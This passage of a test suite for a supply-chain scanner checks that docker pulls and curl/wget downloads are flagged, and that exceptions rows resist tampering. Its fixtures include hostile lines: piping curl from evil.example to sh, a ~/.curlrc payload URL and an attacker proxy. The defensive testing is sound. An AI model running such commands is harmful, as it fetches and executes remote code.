assert imgs(step("docker run --pull=never --pull=always localhost/x" + D + " true")), "the LAST --pull wins: always downloads"
assert not imgs(step("docker run --pull=always --pull=never localhost/fa-x true")), "the last --pull is never: local"
assert imgs(step("docker run --pull=never --pull=always localhost/fa-x true")), "the last --pull is always: a tag-only localhost/ image is an item"
assert not imgs(step("podman run --pull never localhost/fa-x true")), "podman and a separate value too"
assert imgs(step("docker pull --pull=never localhost/fa-x")), "docker pull is never exempt (tag-only form: no digest scan to mask a mistake)"
assert imgs(step("docker run localhost/x" + D + " --pull=never")), "a --pull after the image operand is the container's argument, not a policy"
assert imgs(step("docker run --label x --pull always localhost/x" + D + " true")), "--pull always as a separate value downloads"
assert imgs(step("docker pull --pull=never localhost/x" + D)), "docker pull never exempts"
assert imgs(step("docker run --label=--pull=never localhost/x" + D + " true")), "a quoted/attached option VALUE that spells --pull=never is not a policy"
# tag-only forms (no digest scan to mask a mistake): one parser for the policy and the image (Codex #187 round 3)
assert imgs(step("docker run --pull=never --cpu-period 100000 --pull=always localhost/fa-x true")), "a numeric option value before the last --pull"
assert imgs(step("docker run --pull=never --label \"description=hello world\" --pull=always localhost/fa-x true")), "a quoted option value with a space before the last --pull"
assert not imgs(step("docker run --cpu-period 100000 --pull=never localhost/fa-x true")), "a numeric option value before --pull=never stays local"
assert not imgs(step("docker run --label \"description=hello world\" --pull=never localhost/fa-x true")), "a quoted value before --pull=never stays local"
assert imgs(step("docker run localhost/fa-x --pull=never")), "a --pull after the image operand is the container's argument (tag-only)"
assert imgs(step("docker run --name --pull=never localhost/fa-x true")), "an option's value that spells --pull=never is not a policy (tag-only)"
assert imgs(step("docker run --pull=always --rm 123 --pull=never localhost/fa-x")), "a boolean flag does not take the next word: 123 is the operand, the rest are container arguments (Codex #187 round 4)"
assert imgs(step("docker run --frobnicate 5 --pull=never localhost/fa-x true")), "an option of unknown arity withholds the exemption"
assert not imgs(step("docker run -d --rm --init --pull=never localhost/fa-x true")), "known booleans and a known cluster stay local"
assert not imgs(step("docker run -dit --pull=never localhost/fa-x true")), "a short cluster of booleans is known"
assert not imgs(step("docker run --memory=512m --pull=never localhost/fa-x true")), "--name=value of a known value option is known"
sh = {"bin/check.sh": "docker run --pull=never --label \"a b\" --pull=always localhost/fa-x" + D + " true\n"}
assert imgs(sh), "the same in a script"
assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "an option's value that spells --pull=never is not a policy"
cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
PY

# --- REQ-SUP-001-AC16: ruled text lines. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's
# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 64-hex hash of the downloader segment), line (the 64-hex hash of the
# WHOLE flattened line the segment sits in), ruling[, count]}. A matching row reports the item
# as ruled text; no row, a wrong hash (an edited line), a row on the pull request's side only, or more occurrences than the row counts fail as before;
# a malformed list stops the check (exit 2), never "nothing exempted" and never "everything exempted". -------------------------------------------------------
rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
pyw() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }   # python that writes FILE with TEXT
newcase rt "$(pyw bin/ruled.sh "$rtext")"
# rtrows REPO OUT MODE: writes an exceptions file whose unmeasured_text rows are built from the REAL scan of REPO (HEAD~1..HEAD), changed by MODE
rtrows() {
  python3 - "$chk" "$1" "$2" "$3" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
repo, out, mode = sys.argv[2:5]
added = ac._added_unmeasured(repo, "HEAD~1", "HEAD")
import hashlib, re, subprocess
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
def lines_for(f, kh):   # an independent oracle: the whole flattened lines (as the scan flattens them) that hold a segment, or are a line, hashing to kh
    text = subprocess.run(["git", "-C", repo, "show", "HEAD:" + f], capture_output=True, text=True, check=True).stdout
    out = []
    for line in re.sub(r"\\\n\s*", " ", text).split("\n"):
        flat = " ".join(line.split())
        if flat and (H(flat) == kh or any(H(s) == kh for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat))) and H(flat) not in out:
            out.append(H(flat))
    return out
rows = [{"file": f, "form": w, "key": k.split(":", 1)[0], "line": lh, "ruling": "text, not a command: a test line"} for f, w, k in added for lh in lines_for(f, k.split(":", 1)[0])]
assert len(rows) >= len(added), (rows, added)
raw = None
d = {"_format": "t", "exceptions": []}
if mode == "all": pass
elif mode == "first": rows = rows[:1]
elif mode == "none": rows = []
elif mode == "wronghash": rows[0]["key"] = ("0" if rows[0]["key"][0] != "0" else "1") + rows[0]["key"][1:]
elif mode == "wrongfile": rows = [dict(r, file="bin/other.sh") for r in rows]
elif mode == "wrongform": rows = [dict(r, form="a system package install") for r in rows]
elif mode == "emptyruling": rows[0]["ruling"] = ""
elif mode == "spaceruling": rows[0]["ruling"] = " \t "
elif mode == "noruling": del rows[0]["ruling"]
elif mode == "nokey": del rows[0]["key"]
elif mode == "intkey": rows[0]["key"] = 12345
elif mode == "shortkey": rows[0]["key"] = rows[0]["key"][:12]
elif mode == "fullkey": rows[0]["key"] = added[0][2]
elif mode == "upperkey": rows[0]["key"] = rows[0]["key"].upper()
elif mode == "dup": rows = rows + rows[:1]
elif mode == "extra": rows[0]["note"] = "x"
elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["form"], rows[0]["key"], rows[0]["line"], rows[0]["ruling"]]
elif mode == "noline": del rows[0]["line"]
elif mode == "intline": rows[0]["line"] = 7
elif mode == "shortline": rows[0]["line"] = rows[0]["line"][:15]
elif mode == "upperline": rows[0]["line"] = rows[0]["line"].upper()
elif mode == "wrongline": rows[0]["line"] = ("0" if rows[0]["line"][0] != "0" else "1") + rows[0]["line"][1:]
elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "ruling": "text, not a command: another ruling"}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
elif mode == "count0": rows[0]["count"] = 0
elif mode == "countbool": rows[0]["count"] = True
elif mode == "countstr": rows[0]["count"] = "2"
elif mode == "count1": rows = [dict(r, count=1) for r in rows]
elif mode == "count2": rows = [dict(r, count=2) for r in rows]
elif mode == "count100": rows = [dict(r, count=100) for r in rows]
elif mode == "count101": rows[0]["count"] = 101
elif mode == "countfloat": rows[0]["count"] = 2.0
elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
elif mode == "notlist": rows = {"rows": rows}
elif mode == "emptyfile": rows[0]["file"] = ""
else: raise SystemExit("unknown mode " + mode)
d["unmeasured_text"] = rows
if raw is not None:
    open(out, "w").write(raw)
else:
    json.dump(d, open(out, "w"), indent=2)
PY
}
rtck() { # REPO MODE [extra args] -> rc, $work/rt.out
  local repo=$1 mode=$2; shift 2; rtrows "$work/$repo" "$work/rt-$mode.json" "$mode"; rc=0
  python3 "$chk" --root "$work/$repo" --base HEAD~1 --head HEAD --json "$work/rt.json" --exceptions "$work/rt-$mode.json" "$@" >"$work/rt.out" 2>&1 || rc=$?
}
CASE="AC16 setup: the fixture adds exactly two unmeasured text lines (a comment and an echo that mention a download tool), the scan stays strict"
check python3 - "$chk" "$work/rt" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
a = ac._added_unmeasured(sys.argv[2], "HEAD~1", "HEAD")
assert len(a) == 2 and all(x[0] == "bin/ruled.sh" and x[1] == "a download" for x in a), a
PY
rtck rt all
CASE="AC16: a base-branch row for each added text line (file, form, line hash, ruling) passes: exit 0, each reported as ruled text with its ruling"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2; check grep -q 'text, not a command: a test line' "$work/rt.out"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1]))['moved']; assert len(r)==2 and all(x['ok'] and 'ruled text' in x['reason'] for x in r), r" "$work/rt.json"
rtck rt first
CASE="AC16: a row exempts exactly its own item: the other added line has no row and fails (exit 1), named as unmeasured, while the ruled one is reported as ruled"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
rtck rt none
CASE="AC16: an empty unmeasured_text list exempts nothing: both added lines fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
rtck rt wronghash
CASE="AC16: a row whose line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
for m in wrongfile wrongform; do rtck rt $m
CASE="AC16: a row with the right hash but the wrong ${m#wrong} does not apply: both items fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2; done
rtck rt wrongline
CASE="AC16: a row whose WHOLE-line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
rtrows "$work/rt" "$work/rt-orig.json" all
newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat nantop infnested neginfrow; do rtck rt $m
CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --exceptions "$work/rt-badjson.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: an exceptions file that is not JSON stops the check (exit 2), never 'nothing ruled'"
check test "$rc" -eq 2
rc=0; python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --exceptions "$work/does-not-exist.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: an --exceptions path that does not exist stops the check (exit 2)"
check test "$rc" -eq 2
echo '{"exceptions": []}' >"$work/rt-nolist.json"; rc=0
python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --exceptions "$work/rt-nolist.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: a file with no unmeasured_text list rules nothing: the added lines fail as before (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
# the same line twice: a row covers ONE occurrence unless it says count
newcase rt2 "$(pyw bin/ruled.sh "$rtext${rtext#*$'\n'}")"
rtck rt2 all
CASE="AC16: the same text lines added TWICE need rows that count both: a row without count covers one occurrence, so the items fail (exit 1)"
check test "$rc" -eq 1
rtck rt2 count1
CASE="AC16: count 1 on lines added twice fails too (exit 1)"
check test "$rc" -eq 1
rtck rt2 count2
CASE="AC16: count 2 on lines added twice passes (exit 0)"
check test "$rc" -eq 0
# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
cat >"$work/sx-ruled.txt" <<'EOF'
    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
EOF
cat >"$work/sx-attack.txt" <<'EOF'
echo 'url = https://attacker.example/payload.sh' > ~/.curlrc
export https_proxy=http://attacker.example:3128
echo $'x|\n      curl -s https://evil.example/x |y' | sh
EOF
cat >"$work/sx-other.txt" <<'EOF'
echo 'a|\n      curl -s https://evil.example/x|b' | bash
EOF
newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
rtrows "$work/sx" "$work/rt-sx.json" all
sxck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --exceptions "$work/rt-sx.json" >"$work/rt.out" 2>&1 || rc=$?; }
sxck sx
CASE="AC16 (whole line): the ruled line itself, with its row (segment hash and whole-line hash), passes (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
newcase sxa "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-attack.txt")")"
sxck sxa
CASE="AC16 (whole line): the Sonnet reproduction (the ruled segment embedded in another line that pipes to sh, next to a .curlrc and a proxy) FAILS (exit 1): not ruled"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/build-helpers-test.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
newcase sxo "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-other.txt")")"
sxck sxo
CASE="AC16 (whole line): the same segment with different surrounding text in another line FAILS (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
newcase sxboth "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt" "$work/sx-attack.txt")")"
sxck sxboth
CASE="AC16 (whole line): the ruled line AND the segment hidden in another line in one file: the item FAILS (exit 1), the ruled line lends nothing"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
for edit in 's/b\.yaml/c.yaml/' 's/same-step/same-stop/' 's/tee -a/tee/' 's/- runs/- run/'; do
  newcase sxe "$(pyw bin/build-helpers-test.sh "$(sed "$edit" "$work/sx-ruled.txt")")"
  sxck sxe
  CASE="AC16 (whole line): editing ANY part of the ruled line, even outside the downloader segment ($edit), voids its row: exit 1"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
done
newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
sxck sxm
CASE="AC16 (whole line): the ruled line moved to another file is not ruled: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/other-test.sh' "$work/rt.out"
rtck rt2 count100
CASE="AC16: count 100 (the cap) is accepted: lines added twice pass (exit 0)"
check test "$rc" -eq 0
# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
twoc() {
  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
import pathlib, subprocess, sys
root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
PY
}
# mkrow OUT FILE LINE [count]: one row for the download segment of LINE (first segment naming curl or wget), bound to LINE, flattened as the scan flattens
mkrow() {
  python3 - "$@" <<'PY'
import hashlib, json, re, sys
out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
row = {"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": "text, not a command: a test line"}
if len(sys.argv) > 4: row["count"] = int(sys.argv[4])
json.dump({"exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
print(row["key"], row["line"])
PY
}
edck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --exceptions "$2" >"$work/rt.out" 2>&1 || rc=$?; }
echo '{"exceptions": [], "unmeasured_text": []}' >"$work/rt-empty.json"
CASE="edited line: Codex's row for bin/ruled.sh has key and line (the scan's hashes of the ruled text)"
check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd7313c1ca7f03fcc156e6e22e874446a26f5f759c5e0a083f 0c81fb09bb82dffd7313c1ca7f03fcc156e6e22e874446a26f5f759c5e0a083f"
twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
edck cx "$work/rt-codex.json"
CASE="edited line (Codex, verbatim): the base has the ruled text, the head pipes the same segment to sh: an ADDITION that no row names: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
edck pre "$work/rt-empty.json"
CASE="edited line (the pre-existing class): a flagged base line rewritten with the same download segment (-o /tmp/a -> | sh) is an addition: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:tools/fetch.sh' "$work/rt.out"
twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
edck keep "$work/rt-empty.json"
CASE="edited line: an untouched flagged base line stays not added (another line of the file changed): exit 0"
check test "$rc" -eq 0
twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
edck ws "$work/rt-empty.json"
CASE="edited line: a whitespace-only edit (spaces and tabs) stays not added, as the scan flattens it: exit 0"
check test "$rc" -eq 0
# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
sp="echo ok # note; curl -s http://e.example/x | sh"
mkrow "$work/rt-sp.json" bin/ruled.sh "$sp" >/dev/null
twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
edck sp0 "$work/rt-sp.json"
CASE="R1 control: the space version with its row is ruled: exit 0"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
for ch in 1f a0 0b 0c 85 0d; do
  twoc spx bin/ruled.sh $'#!/bin/sh\n' "$(printf '#!/bin/sh\necho ok')$(python3 -c "import sys; sys.stdout.write(chr(0x$ch))")$(printf '# note; curl -s http://e.example/x | sh\nx')"
  edck spx "$work/rt-sp.json"
  CASE="R1: the same line with U+00$ch where the space was flattens identically but is never ruled: exit 1"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
done
mkrow "$work/rt-cont.json" bin/ruled.sh "echo a curl -s http://e.example/x" >/dev/null
twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
edck cont1 "$work/rt-cont.json"
CASE="R1: a backslash-newline continuation (echo a\\<newline>curl ...) is never ruled, though it flattens to the ruled line: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
edck cont0 "$work/rt-cont.json"
CASE="R1 control: the one-line version with its row is ruled: exit 0"
check test "$rc" -eq 0
# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
edck ctx "$work/rt-empty.json"
CASE="context limit (documented): a harmless ruled echo moved above its heredoc opener keeps its identity, so it is no addition (exit 0); it still only echoes"
check test "$rc" -eq 0
# --- REQ-SUP-001-AC16, the second allowed row form (advisor, Oct 10): a HARNESS ASSERTION LINE. Its whole grammar is ONE data structure, HARNESS_WHITELIST in
# harness_form.py below (the allowed characters, shape, command words, separators, test operators, grep options, exit statuses, argument names and paths,
# substitutions and double-quoted pattern characters); anything it does not name is refused. In short: t "RULE" "TITLE" bash -c 'BODY' _ "$work/.." "$CALLS"..
# with no expansion of any kind in RULE or TITLE, a SINGLE-QUOTED body (Codex R1) that names the paths only as whole "$1".."$9", no character outside
# printable ASCII and tab (Sonnet R1: a newline), and test / [ limited to file tests, = / != and count comparisons (Sonnet R1: bash 5 evaluates $(...) in
# -v, -R and arithmetic operands). harness_form.py decides a line (exit 0 'harness assertion', exit 1 'refused: why'; --file F reads it from a file).
# Proofs: each refused variant is its own case; the complement enumeration (hf_enum.py) puts every token class outside the whitelist in every position it can
# take; the mutation run widens the whitelist by one token at a time and requires the enumeration to catch it; the runtime proof executes the corpus under
# every bash on PATH (5.x and, where present, 3.2) with a marker-writing curl stub, with plain and hostile argument values.
cat >"$work/harness_form.py" <<'PY'
import re, sys
ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
# HARNESS_WHITELIST: the WHOLE grammar of a ruled harness assertion line (REQ-SUP-001-AC16, second row form). Everything not named here is refused.
HARNESS_WHITELIST = {
    "line_chars": "".join(chr(c) for c in range(0x20, 0x7F)) + "\t",   # the line holds only these (no newline, CR, control or non-ASCII character)
    "shape": "t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG...",          # optional leading spaces; ARG... is zero to nine path arguments
    "rule_title_chars": ALNUM + " :-.(),=",                            # RULE and TITLE: no expansion of any kind (no $, backtick, backslash, quote)
    "arg_names": ["work", "CALLS"],                                    # an ARG is "$NAME" or "$NAME/SEG/..." with NAME from this list
    "arg_path_chars": ALNUM + "_.-",                                   # SEG: one or more of these
    "max_args": 9,
    "separators": ["&&", "||", "|", ";"],                              # between the commands of BODY
    "negation": ["!"],                                                 # may precede a command, or a test expression
    "commands": ["grep", "test", "[", "cat", "exit"],                  # the command words of BODY, unquoted
    "pipe_into": ["grep"],                                             # the only command after a |
    "grep_options": ["-E", "-q", "-v", "-Eq"],                         # grep's options: bare words, before end_of_options
    "end_of_options": "--",                                            # REQUIRED: grep OPTION... -- PATTERN ["$N"...] and cat -- "$N" (an operand never reads as an option)
    "pattern_first_char_not": "-",                                     # a double-quoted grep pattern may not start with this
    "grep_bare_patterns": ["."],                                       # the only unquoted grep pattern
    "test_unary": ["-f", "-s", "-e", "-d", "-r"],                      # test / [ : OP X
    "test_string": ["=", "!="],                                        # test / [ : X OP Y
    "test_count": ["-eq", "-ne", "-lt", "-le", "-gt", "-ge"],          # test / [ : N OP N, N = plain digits or the grep count substitution
    "exit_status": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],  # exit takes exactly one of these
    "positional": "\"$1\" .. \"$9\", whole, at most the number of ARGs", # how BODY names a path: grep's file operands, cat's one operand
    "substitutions": {"grep": "-c", "cat": ""},                        # "$(grep -c OPTION... -- PATTERN "$N")" (a count) and "$(cat -- "$N")", whole and double-quoted
    "dquote_chars": ALNUM + " ^.*:/|()=-",                             # inside a double-quoted BODY word (a pattern)
    "dquote_escapes": ["\\.", "\\[", "\\]"],                         # the only backslash sequences inside a double-quoted BODY word
}
# END HARNESS_WHITELIST
W = HARNESS_WHITELIST
GSUB, CSUB = "\x01G", "\x01C"                              # placeholders: a character outside line_chars can never come from an accepted line
class Refused(Exception): pass
def cls(chars): return "[" + "".join(re.escape(c) for c in chars) + "]"
DQ = '"(?:' + "|".join([cls(W["dquote_chars"])] + [re.escape(e) for e in W["dquote_escapes"]]) + ')*"'
PAT = ('"(?!' + re.escape(W["pattern_first_char_not"]) + ')' + DQ[1:]) if W["pattern_first_char_not"] else DQ   # a pattern word: no leading option character
EOO = (" +" + re.escape(W["end_of_options"])) if W["end_of_options"] else ""
POS = r'"\$([1-9])"'
def alt(xs): return "(?:" + "|".join(re.escape(x) for x in sorted(xs, key=len, reverse=True)) + ")"
SUBS = []
for cmd, lead in W["substitutions"].items():
    extra = ("(?: +" + alt(W["grep_options"]) + ")*" + EOO + " +(?:" + alt(W["grep_bare_patterns"]) + "|" + PAT + ")") if cmd == "grep" else EOO
    SUBS.append((re.compile(r'"\$\(' + re.escape(cmd) + ((" " + re.escape(lead)) if lead else "") + extra + r' "\$([1-9])"\)"'), GSUB if cmd == "grep" else CSUB))
SHAPE = re.compile(r' *t "(' + cls(W["rule_title_chars"]) + r'*)" "(' + cls(W["rule_title_chars"]) + r'*)" bash -c \'([^\']*)\' _((?: +"[^"]*")*)')
ARG = re.compile(r'"\$' + alt(W["arg_names"]) + r'(?:/' + cls(W["arg_path_chars"]) + r'+)*"')
def tokens(body):                                          # [("sep", s)] or [("word", text, kind)]; kind: bare, dq, pos, gsub, csub
    out, i, n = [], 0, len(body)
    seps = sorted(W["separators"], key=len, reverse=True)
    while i < n:
        if body[i] in " \t": i += 1; continue
        s = next((s for s in seps if body.startswith(s, i)), None)
        if s: out.append(("sep", s)); i += len(s); continue
        j = i
        while j < n and body[j] not in " \t" and not any(body.startswith(s, j) for s in seps):
            if body[j] == '"':
                k = body.find('"', j + 1)
                if k < 0: raise Refused("an unterminated double quote in the body")
                j = k + 1
            else: j += 1
        w = body[i:j]; i = j
        if '"' not in w: out.append(("word", w, "bare")); continue
        if not (len(w) >= 2 and w[0] == '"' and w[-1] == '"' and '"' not in w[1:-1]): raise Refused(f"the word {w!r} mixes quoted and unquoted text")
        if w == '"' + GSUB + '"': out.append(("word", w, "gsub")); continue
        if w == '"' + CSUB + '"': out.append(("word", w, "csub")); continue
        m = re.fullmatch(POS, w)
        if m: out.append(("word", m.group(1), "pos")); continue
        if not re.fullmatch(DQ, w): raise Refused(f"the double-quoted word {w!r} holds a character or escape outside dquote_chars / dquote_escapes")
        out.append(("word", w, "dq"))
    return out
def test_expr(args):
    while args and args[0][2] == "bare" and args[0][1] in W["negation"]: args = args[1:]
    operand = lambda a: a[2] in ("dq", "pos", "gsub", "csub") or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
    count = lambda a: a[2] == "gsub" or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
    if len(args) == 2 and args[0][2] == "bare" and args[0][1] in W["test_unary"] and args[1][2] == "pos": return   # a file test names a positional "$N" only
    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_string"] and operand(args[0]) and operand(args[2]): return
    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_count"] and count(args[0]) and count(args[2]): return
    raise Refused("a test / [ expression outside test_unary (on a positional \"$N\"), test_string and test_count (with their operands)")
def judge(line):
    bad = [c for c in line if c not in W["line_chars"]]
    if bad: raise Refused(f"a character outside the line character set ({bad[0]!r}): bash may read the line differently")
    m = SHAPE.fullmatch(line)
    if not m: raise Refused("not the shape t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG... (or a RULE / TITLE character outside rule_title_chars)")
    args = re.findall(r' +("[^"]*")', m.group(4))
    if len(args) > W["max_args"]: raise Refused("more path arguments than max_args")
    for a in args:
        if not ARG.fullmatch(a): raise Refused(f"the argument {a} is not \"$NAME\" or \"$NAME/SEG...\" with NAME in arg_names")
    body = m.group(3)
    for rx, ph in SUBS:
        for mm in rx.finditer(body):
            if int(mm.group(1)) > len(args): raise Refused(f"${mm.group(1)} names no argument")
        body = rx.sub('"' + ph + '"', body)
    cmds, cur, seps = [], [], []
    for t in tokens(body):
        if t[0] == "sep": cmds.append(cur); seps.append(t[1]); cur = []
        else: cur.append(t)
    cmds.append(cur)
    for k, c in enumerate(cmds):
        for t in c:
            if t[2] == "pos" and int(t[1]) > len(args): raise Refused(f"${t[1]} names no argument")
